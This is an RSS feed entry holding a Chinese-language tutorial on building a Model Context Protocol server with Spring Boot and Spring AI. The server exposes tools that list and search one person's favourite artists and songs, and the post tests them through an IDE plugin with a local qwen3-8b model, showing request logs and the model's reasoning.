<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[使用 Spring AI 创建 MCP 服务器]]></title>    <link>https://juejin.cn/post/7574600119750148106</link>    <guid>https://juejin.cn/post/7574600119750148106</guid>    <pubDate>2025-11-20T07:43:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574600119750148106" data-draft-id="7574621387572559918" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="使用 Spring AI 创建 MCP 服务器"/> <meta itemprop="keywords" content="MCP"/> <meta itemprop="datePublished" content="2025-11-20T07:43:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="信码由缰"/> <meta itemprop="url" content="https://juejin.cn/user/2110664941509214"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            使用 Spring AI 创建 MCP 服务器
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2110664941509214/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    信码由缰
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-20T07:43:45.000Z" title="Thu Nov 20 2025 07:43:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文提供了使用 Spring AI 创建模型上下文协议服务器的分步指南，并阐述了使用 MCP 的优势。</p>
</blockquote>
<p><img src="https://cf-blog.icodebuddy.com/image/90/90-0.jpeg" alt="" loading="lazy"/></p>
<p>在本篇博客中，您将学习如何使用 Spring AI 创建一个模型上下文协议服务器。您将看到创建自己的 MCP 服务器是多么简单。</p>
<h2 data-id="heading-0">引言</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmodelcontextprotocol.io%2F" target="_blank" title="https://modelcontextprotocol.io/" ref="nofollow noopener noreferrer">模型上下文协议（Model Context Protocol）</a>为将大型语言模型（LLM）连接到各种数据源和工具提供了一种<strong>标准化</strong>的方式。这句话中的"标准化"一词非常重要。这意味着与数据源和工具的集成变得比以往容易得多。除此之外，MCP 服务器通过额外的知识或功能来增强您的 LLM，使其成为一个更强大的助手。想象一下，您可以要求 LLM 为您预订假期。</p>
<p>根据您的偏好，它将在互联网上搜索合适的地点、预订酒店、预订航班等等，然后您就可以出发了！当然，LLM 需要能够为您预订酒店和航班。这种附加功能可以由 MCP 服务器提供。这听起来很吸引人，但也有些令人担忧。为了预订酒店，MCP 服务器需要知道您的个人详细信息并需要访问您的信用卡。这可能不是一个好主意。建议对<em>敏感</em>操作使用人工介入（HITL），以便您可以批准或拒绝某项操作。然而，MCP 服务器将使您的生活变得更加轻松。</p>
<p>在本博客中，您将学习如何使用 Spring Boot 和 Spring AI 创建自己的 MCP 服务器。没有 MCP 客户端，服务器将毫无用处。MCP 客户端与一个或多个 MCP 服务器交互，并且是控制方。作为 MCP 客户端，您将（滥）用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdevoxx%2FDevoxxGenieIDEAPlugin" target="_blank" title="https://github.com/devoxx/DevoxxGenieIDEAPlugin" ref="nofollow noopener noreferrer">IntelliJ DevoxxGenie 插件</a>。DevoxxGenie 实际上是一个 AI 编码助手，但您也可以使用它来测试您的 MCP 服务器。在下一篇博客中，您将创建自己的 MCP 客户端。</p>
<p>本篇博客中使用的源代码可在 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmydeveloperplanet%2Fmymcpserverplanet" target="_blank" title="https://github.com/mydeveloperplanet/mymcpserverplanet" ref="nofollow noopener noreferrer">GitHub</a> 的 <strong>server</strong> 目录中找到。</p>
<h2 data-id="heading-1">先决条件</h2>
<p>阅读本博客的先决条件是：</p>
<ul>
<li>
<p>基础的 Java 知识；</p>
</li>
<li>
<p>基础的 Spring Boot 知识；</p>
</li>
<li>
<p>基础的 LMStudio 知识；</p>
</li>
<li>
<p>基础的 IntelliJ 和 DevoxxGenie 知识。</p>
</li>
</ul>
<h2 data-id="heading-2">构建 MCP 服务器</h2>
<p>您将构建的 MCP 服务器具有以下功能：</p>
<ul>
<li>
<p>返回我喜爱的艺术家列表</p>
</li>
<li>
<p>返回我喜爱的歌曲列表</p>
</li>
</ul>
<p>LLM 不会拥有关于此信息的任何知识，而当它能够访问这些工具时，希望它会利用它们。本应用深受 Dan Vega 的《<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.danvega.dev%2Fblog%2Fcreating-your-first-mcp-server-java" target="_blank" title="https://www.danvega.dev/blog/creating-your-first-mcp-server-java" ref="nofollow noopener noreferrer">使用 Java 创建您的第一个模型上下文协议服务器</a>》的启发。</p>
<p>访问 <a href="https://link.juejin.cn?target=https%3A%2F%2Fstart.spring.io%2F" target="_blank" title="https://start.spring.io/" ref="nofollow noopener noreferrer">Spring Initializr</a> 并添加依赖项 <code>Model Context Protocol Server</code>。这将在 <code>pom.xml</code> 中添加以下依赖项。</p>
<pre><code class="hljs language-xml" lang="xml">
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.ai<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-ai-starter-mcp-server<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

</code></pre>
<p>创建 <code>Artist</code> 的数据模型。</p>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-keyword">public</span> <span class="hljs-keyword">record</span> <span class="hljs-title class_">Artist</span><span class="hljs-params">(String name)</span> {

}

</code></pre>
<p>创建 <code>Song</code> 的数据模型。</p>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-keyword">public</span> <span class="hljs-keyword">record</span> <span class="hljs-title class_">Song</span><span class="hljs-params">(Artist artist, String title)</span> {

}

</code></pre>
<p>创建 <code>ArtistService</code>。该服务将包含一个我喜爱的艺术家列表，但在实际应用中，这些信息将存储在数据库中。通过使用 <code>@Tool</code> 注解来定义一个名为 <code>get_artists</code> 的工具。为工具提供名称和描述。LLM 将使用该描述来了解工具的功能。</p>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-meta">@Service</span>

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ArtistService</span> {

  


<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;Artist&gt; artists = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

  


<span class="hljs-meta">@Tool(name = "get_artists", description = "获取 Gunter 喜爱的艺术家完整列表")</span>

<span class="hljs-keyword">public</span> List&lt;Artist&gt; <span class="hljs-title function_">getArtists</span><span class="hljs-params">()</span> {

<span class="hljs-keyword">return</span> artists;

}

  


<span class="hljs-meta">@PostConstruct</span>

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {

artists.addAll(List.of(

<span class="hljs-keyword">new</span> <span class="hljs-title class_">Artist</span>(<span class="hljs-string">"Bruce Springsteen"</span>),

<span class="hljs-keyword">new</span> <span class="hljs-title class_">Artist</span>(<span class="hljs-string">"JJ Johnson"</span>)

));

}

  


}

</code></pre>
<p>以类似的方式，创建 <code>SongService</code>。</p>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-meta">@Service</span>

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SongService</span> {

  


<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;Song&gt; songs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

  


<span class="hljs-meta">@Tool(name = "get_songs", description = "获取 Gunter 喜爱的歌曲完整列表")</span>

<span class="hljs-keyword">public</span> List&lt;Song&gt; <span class="hljs-title function_">getSongs</span><span class="hljs-params">()</span> {

<span class="hljs-keyword">return</span> songs;

}

  


<span class="hljs-meta">@PostConstruct</span>

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {

songs.addAll((List.of(

<span class="hljs-keyword">new</span> <span class="hljs-title class_">Song</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Artist</span>(<span class="hljs-string">"Bruce Springsteen"</span>), <span class="hljs-string">"My Hometown"</span>),

<span class="hljs-keyword">new</span> <span class="hljs-title class_">Song</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Artist</span>(<span class="hljs-string">"JJ Johnson"</span>), <span class="hljs-string">"Lament"</span>)

)));

}

  


}

</code></pre>
<p>您通过一个 <code>Bean</code> 来注册这些工具。</p>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-meta">@SpringBootApplication</span>

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyMcpServerPlanetApplication</span> {

  


<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {

SpringApplication.run(MyMcpServerPlanetApplication.class, args);

}

  


<span class="hljs-meta">@Bean</span>

<span class="hljs-keyword">public</span> ToolCallbackProvider <span class="hljs-title function_">mcpServices</span><span class="hljs-params">(ArtistService artistService, SongService songService)</span> {

<span class="hljs-keyword">return</span> MethodToolCallbackProvider.builder()

.toolObjects(artistService, songService)

.build();

}

  


}

</code></pre>
<p>最后，添加以下 <code>application.properties</code> 配置。</p>
<pre><code class="hljs language-properties" lang="properties">
spring.main.web-application-type=none

spring.ai.mcp.server.name=mcp-server

spring.ai.mcp.server.version=0.0.1

  


spring.main.banner-mode=off

logging.pattern.console=

</code></pre>
<p>此配置做了几件重要的事情：</p>
<ul>
<li>
<p><strong>禁用 Web 应用程序</strong>：由于 MCP 使用 STDIO 传输，因此不需要 Web 服务器。</p>
</li>
<li>
<p><strong>设置服务器名称和版本</strong>：这用于向客户端标识 MCP 服务器。</p>
</li>
<li>
<p><strong>禁用横幅和控制台日志记录</strong>：这对于 STDIO 传输正常工作至关重要。</p>
</li>
</ul>
<p>构建 jar 文件。</p>
<pre><code class="hljs language-shell" lang="shell">
mvn clean verify

</code></pre>
<p>这将在 <code>target</code> 目录中生成一个 jar 文件：<code>target/mcp-server-0.0.1-SNAPSHOT.jar</code>。</p>
<h2 data-id="heading-3">测试 MCP 服务器</h2>
<p>为了测试 MCP 服务器，需要一个 MCP 客户端。如前所述，将使用 DevoxxGenie 来实现此目的。</p>
<p>将 MCP 服务器添加到 DevoxxGenie 的 MCP 设置中。请注意，您需要对命令和参数使用完整路径。</p>
<ul>
<li>
<p><strong>名称</strong>：MyMcpServerPlanet</p>
</li>
<li>
<p><strong>传输类型</strong>：STDIO</p>
</li>
<li>
<p><strong>命令</strong>：<code>/&lt;java installation directory&gt;/bin/java</code></p>
</li>
<li>
<p><strong>参数</strong>：<code>-jar /home/&lt;project directory&gt;/mymcpserverplanet/server/target/mymcpserverplanet-0.0.1-SNAPSHOT.jar</code></p>
</li>
</ul>
<p><img src="https://cf-blog.icodebuddy.com/image/90/90-1.png" alt="Test MCP Server" loading="lazy"/>)</p>
<p>单击"<strong>测试连接并获取工具</strong>"按钮。按钮的标题应变更为"<strong>连接成功！找到 2 个工具</strong>"。</p>
<p>与 DevoxxGenie 一起，使用 LMStudio 作为推理引擎，模型 <code>qwen3-8b</code> 在 GPU 上运行。</p>
<p>输入提示：<code>给我一个 Gunter 喜爱的艺术家列表。</code></p>
<p>该请求被发送到 LMStudio，可用的工具也随请求一起发送。如果您在 LMStudio 中启用了调试日志，可以检查该请求。</p>
<pre><code class="hljs language-json" lang="json">
<span class="hljs-number">2025</span><span class="hljs-number">-07</span><span class="hljs-number">-20</span> <span class="hljs-number">11</span><span class="hljs-punctuation">:</span><span class="hljs-number">45</span><span class="hljs-punctuation">:</span><span class="hljs-number">42</span> <span class="hljs-punctuation">[</span>DEBUG<span class="hljs-punctuation">]</span>

Received request<span class="hljs-punctuation">:</span> POST to /v1/chat/completions with body <span class="hljs-punctuation">{</span>

<span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"qwen3-8b"</span><span class="hljs-punctuation">,</span>

<span class="hljs-attr">"messages"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>

<span class="hljs-punctuation">{</span>

<span class="hljs-attr">"role"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"system"</span><span class="hljs-punctuation">,</span>

<span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"You are a software developer IDEA plugin with expe... &lt;日志中已截断&gt; ...at is correct and relevant to the code or plugin.\n"</span>

<span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>

<span class="hljs-punctuation">{</span>

<span class="hljs-attr">"role"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"user"</span><span class="hljs-punctuation">,</span>

<span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"&lt;ProjectPath&gt;\n/home/&lt;project directory&gt;... &lt;日志中已截断&gt; ... list of gunter's favorite artists\n&lt;/UserPrompt&gt;\n\n"</span>

<span class="hljs-punctuation">}</span>

<span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>

<span class="hljs-attr">"temperature"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>

<span class="hljs-attr">"top_p"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.9</span><span class="hljs-punctuation">,</span>

<span class="hljs-attr">"stream"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>

<span class="hljs-attr">"max_tokens"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">8000</span><span class="hljs-punctuation">,</span>

<span class="hljs-attr">"tools"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>

<span class="hljs-punctuation">{</span>

<span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"function"</span><span class="hljs-punctuation">,</span>

<span class="hljs-attr">"function"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>

<span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"get_songs"</span><span class="hljs-punctuation">,</span>

<span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"获取 Gunter 喜爱的歌曲完整列表"</span><span class="hljs-punctuation">,</span>

<span class="hljs-attr">"parameters"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>

<span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"object"</span><span class="hljs-punctuation">,</span>

<span class="hljs-attr">"properties"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>

<span class="hljs-attr">"required"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span>

<span class="hljs-punctuation">}</span>

<span class="hljs-punctuation">}</span>

<span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>

<span class="hljs-punctuation">{</span>

<span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"function"</span><span class="hljs-punctuation">,</span>

<span class="hljs-attr">"function"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>

<span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"get_artists"</span><span class="hljs-punctuation">,</span>

<span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"获取 Gunter 喜爱的艺术家完整列表"</span><span class="hljs-punctuation">,</span>

<span class="hljs-attr">"parameters"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>

<span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"object"</span><span class="hljs-punctuation">,</span>

<span class="hljs-attr">"properties"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>

<span class="hljs-attr">"required"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span>

<span class="hljs-punctuation">}</span>

<span class="hljs-punctuation">}</span>

<span class="hljs-punctuation">}</span>

<span class="hljs-punctuation">]</span>

<span class="hljs-punctuation">}</span>

</code></pre>
<p>LLM 将意识到它自己无法回答这个问题。然而，LLM 确实识别出有一个可用的工具可以回答这个问题。因此，LLM 将请求客户端调用 MCP 工具。DevoxxGenie 内置了人工介入机制，并将请求您的批准。</p>
<p><img src="https://cf-blog.icodebuddy.com/image/90/90-2.png" alt="点击批准按钮" loading="lazy"/></p>
<p>点击"<strong>批准</strong>"按钮。MCP 服务器将执行 <code>get_artists</code> 工具，并将响应发送回 LLM。LLM 将使用此响应来给出适当的答案。</p>
<p>收到以下响应，并且完全正确。观察 LLM 的思维过程也很有趣。</p>
<pre><code class="hljs language-plain" lang="plain">
&lt;think&gt; 好的，用户要求提供 Gunter 喜爱的艺术家列表。我调用了 `get_artists` 函数，返回了两位艺术家：Bruce Springsteen 和 JJ Johnson。现在他们可能想知道是否还有更多或者需要进一步帮助。

  


我应该确认结果，也许可以询问他们是否还需要其他什么。由于之前的响应是成功的，保持积极的语气很好。工具调用没有错误，所以这里不需要额外的函数调用。 &lt;/think&gt;

  


以下是 Gunter 喜爱的艺术家：

  


* **Bruce Springsteen**

* **JJ Johnson**

  


如果您需要更多信息或帮助，请告诉我！

</code></pre>
<p>让我们使用以下提示检查 <code>get_songs</code> 工具：<code>给我一个 Gunter 喜爱的歌曲列表</code></p>
<p>遵循相同的过程，响应再次正确。</p>
<pre><code class="hljs language-plain" lang="plain">
&lt;think&gt; 好的，用户要求提供 Gunter 喜爱的歌曲列表。我使用了 get_songs 函数，它检索到了两首歌曲。现在我需要清晰地呈现这些信息。让我用艺术家和歌名来格式化每首歌曲。确保响应易于阅读，也许用项目符号。检查是否需要任何额外信息，但既然用户只想要一个列表，保持简单应该是最好的。 &lt;/think&gt;

  


以下是 Gunter 喜爱的歌曲列表：

  


1. **Bruce Springsteen** - *《My Hometown》*

2. **JJ Johnson** - *《Lament》*

  


如果您想了解这些曲目的更多详细信息，请告诉我！

</code></pre>
<h2 data-id="heading-4">添加搜索功能</h2>
<p>让我们向两个 MCP 工具添加一些基本的搜索功能。</p>
<p>向 <code>ArtistService</code> 添加一个 <code>search_artist</code> 工具。</p>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-meta">@Tool(name = "search_artist", description = "从 Gunter 喜爱的艺术家中搜索单个艺术家")</span>

<span class="hljs-keyword">public</span> Artist <span class="hljs-title function_">getArtist</span><span class="hljs-params">(String name)</span> {

<span class="hljs-keyword">return</span> artists.stream()

.filter(artist -&gt; artist.name().equalsIgnoreCase(name))

.findFirst()

.orElse(<span class="hljs-literal">null</span>);

}

</code></pre>
<p>向 <code>SongService</code> 添加一个 <code>search_song</code> 工具。</p>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-meta">@Tool(name = "search_song", description = "从 Gunter 喜爱的歌曲中搜索单首歌曲")</span>

<span class="hljs-keyword">public</span> Song <span class="hljs-title function_">getSong</span><span class="hljs-params">(String title)</span> {

<span class="hljs-keyword">return</span> songs.stream()

.filter(song -&gt; song.title().equalsIgnoreCase(title))

.findFirst()

.orElse(<span class="hljs-literal">null</span>);

}

</code></pre>
<p>构建 jar 文件并使用 DevoxxGenie 获取新工具。</p>
<p>输入以下提示：<code>Bruce Springsteen 是 Gunter 喜爱的艺术家之一吗？</code></p>
<p>这次调用了 <code>search_artist</code> 工具，响应再次正确。</p>
<pre><code class="hljs language-plain" lang="plain">
&lt;think&gt; 好的，用户询问 Bruce Springsteen 是否是 Gunter 喜爱的艺术家之一。我使用 search_artist 函数并传入了他的名字。响应返回了艺术家 "Bruce Springsteen"。现在我需要检查他是否在 Gunter 的喜爱列表中。

  


等等，可用的函数是 get_artists 和 search_artist。search_artist 函数可能检查艺术家是否存在于数据库中。既然响应返回了该艺术家，那意味着 Bruce Springsteen 确实在 Gunter 喜爱的艺术家列表中。

  


所以答案应该是肯定的。我应该根据函数的响应来确认这一点。既然用户的问题已经得到回答，不需要进一步的操作。只需清晰地呈现结果即可。 &lt;/think&gt;

  


是的，Bruce Springsteen 是 Gunter 喜爱的艺术家之一。搜索确认了他在收藏中。

</code></pre>
<p>输入以下提示：<code>滚石乐队是 Gunter 喜爱的艺术家之一吗？</code></p>
<p>调用了 <code>search_artist</code> 工具，由于未找到滚石乐队，LLM 断定他们不在我喜爱的艺术家列表中。</p>
<pre><code class="hljs language-plain" lang="plain">
&lt;think&gt; 好的，让我试着弄清楚这里发生了什么。用户询问滚石乐队是否是 Gunter 喜爱的艺术家之一。我使用 search_artist 函数，传入了名称 "Rolling Stones"，但响应是 null。这意味着该函数在 Gunter 的喜爱列表中没有找到该名称的艺术家。

  


嗯，也许数据库中艺术家的名称不完全是 "Rolling Stones"。会不会有拼写错误或不同的拼写方式？或者也许他们在系统中以另一个名称而闻名。或者，也许是因为数据不存在，所以函数没有返回任何结果。

  


既然用户是在询问 Gunter 的喜爱列表，我应该检查是否有一种方法可以首先列出所有喜爱的艺术家。get_artists 函数可能会有所帮助。如果我调用它，也许我可以看到滚石乐队是否在列表中。但是等等，用户可能不想要所有艺术家，只是确认这一个特定的。

  


或者，也许 search_artist 函数需要不同的参数。让我再次检查工具定义。search_artist 函数需要一个 "name" 参数，这是必需的。那么查询应该是大小写不敏感的？或者可能是部分匹配？用户可能指的是 "Rolling Stones"，但数据库中的存储方式不同。

  


另一个想法：也许滚石乐队不在 Gunter 喜爱的艺术家列表中。搜索返回了 null，所以可能他们不在。但我应该通过先检查所有艺术家来确认。我应该向用户建议这一点。等等，但用户是专门询问滚石乐队。也许我应该告知他们搜索没有找到任何结果，并询问他们是否想改为检查所有艺术家。

  


等等，响应是 null，所以函数没有返回任何数据。这意味着该艺术家不在列表中。所以答案应该是否定的，滚石乐队不是 Gunter 喜爱的艺术家之一。但是函数调用会不会有错误？让我再检查一遍。函数是 search_artist，名称是 "Rolling Stones"。如果数据库中有确切的名称，那么它应该返回。如果没有，则返回 null。

  


所以结论是滚石乐队不在 Gunter 的喜爱列表中。或者，可能存在拼写错误。但既然用户是直接询问，我应该根据函数的响应来回答。 &lt;/think&gt;

  


在 Gunter 喜爱的艺术家列表中，对艺术家 "Rolling Stones" 的搜索未返回任何结果。这表明滚石乐队**目前并未**列为 Gunter 喜爱的艺术家之一。您想改为查看他喜爱的艺术家的完整列表吗？

</code></pre>
<h2 data-id="heading-5">结论</h2>
<p>在本博客中，您学习了如何使用 Spring Boot 和 Spring AI 创建一个 MCP 服务器。创建 MCP 服务器和添加工具非常容易。您可以专注于工具的功能，而这正是您想要的。</p>
<hr/>
